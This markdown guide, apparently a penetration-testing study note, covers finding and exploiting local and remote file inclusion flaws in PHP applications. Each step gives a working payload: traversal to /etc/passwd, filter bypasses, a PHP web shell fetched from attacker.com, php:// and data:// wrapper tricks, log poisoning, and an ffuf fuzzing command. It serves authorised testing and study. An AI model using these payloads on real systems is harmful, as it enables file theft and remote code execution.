# File Inclusion

[Relative Cheat Sheet](./file-inclusion-cheat.md)

## Step-by-Step Guide for Testing and Exploiting File Inclusion Vulnerabilities

### 1. Understand File Inclusion Vulnerabilities
   - **Explanation**: File inclusion vulnerabilities occur when applications include files based on user input without validation, leading to Local File Inclusion (LFI, reading local files) or Remote File Inclusion (RFI, executing remote files). LFI can leak sensitive data, while RFI can lead to RCE.
   - **Why It's Done**: Knowing LFI vs RFI helps tailor payloads for data extraction or code execution.
   - **Example**: `?file=../../etc/passwd` reads a system file, or `?file=http://attacker.com/shell.php` executes remote code.

### 2. Identify File Inclusion Parameters
   - **Explanation**: Look for URL parameters like `?file=`, `?page=`, or `?template=` that control included files, often in CMS or legacy apps.
   - **Why It's Done**: These are injection points; missing them limits testing scope.
   - **Example**: `http://example.com/index.php?page=about.php` where `page` specifies a file.

### 3. Test for Basic LFI
   - **Explanation**: Inject paths like `/etc/passwd` or `../../etc/passwd` to read sensitive files.
   - **Why It's Done**: Confirms if the application includes local files without validation.
   - **Example**: `page=../../etc/passwd` to display system user file.

### 4. Test Path Traversal Bypasses
   - **Explanation**: Use encoded (`%2e%2e%2f`), nested (`....//`), or absolute paths (`/etc/passwd`) to bypass filters stripping `../`.
   - **Why It's Done**: Many apps filter basic traversal; advanced techniques evade these.
   - **Example**: `page=....//....//etc/passwd` to bypass dot-dot-slash filters.

### 5. Test for RFI
   - **Explanation**: Inject a remote URL (e.g., `http://attacker.com/shell.php`) if `allow_url_include` is enabled.
   - **Why It's Done**: Allows direct code execution from a malicious server.
   - **Example**: Host `shell.php` with `<?php system($_GET['cmd']); ?>` and set `page=http://attacker.com/shell.php`.

### 6. Use PHP Wrappers for Advanced LFI
   - **Explanation**: Use wrappers like `php://filter/convert.base64-encode/resource=config.php` to read source code or `data://` for code execution.
   - **Why It's Done**: Bypasses restrictions on file access or enables RCE.
   - **Example**: `page=php://filter/convert.base64-encode/resource=index.php` to read PHP source.

### 7. Chain with File Upload or Log Poisoning
   - **Explanation**: Upload a malicious file (e.g., `shell.gif` with PHP code) and include it via LFI, or inject code into logs (e.g., user-agent) and include the log file.
   - **Why It's Done**: Turns LFI into RCE when direct RFI isn’t possible.
   - **Example**: Set user-agent to `<?php system($_GET['cmd']); ?>`, include `page=/var/log/apache2/access.log`.

### 8. Fuzz for Files and Paths
   - **Explanation**: Use ffuf with LFI wordlists (e.g., `/opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt`) to find readable files or configs.
   - **Why It's Done**: Automates discovery of sensitive files or directories.
   - **Example**: `ffuf -w LFI-Jhaddix.txt:FUZZ -u http://example.com/?page=FUZZ`.

### 9. Escalate to RCE
   - **Explanation**: Execute commands via included shells or wrappers (e.g., `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+`).
   - **Why It's Done**: Maximizes impact from file read to full system access.
   - **Example**: `page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id`.

### 10. Assess Prevention Measures
   - **Explanation**: Check for absolute paths, whitelists, or disabled `allow_url_include`.
   - **Why It's Done**: Informs remediation, like restricting file paths or disabling dangerous PHP settings.
   - **Example**: Secure app uses `include 'pages/' . basename($file)` to limit inclusions.

This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a thorough process for testing file inclusion vulnerabilities. Test ethically within scope.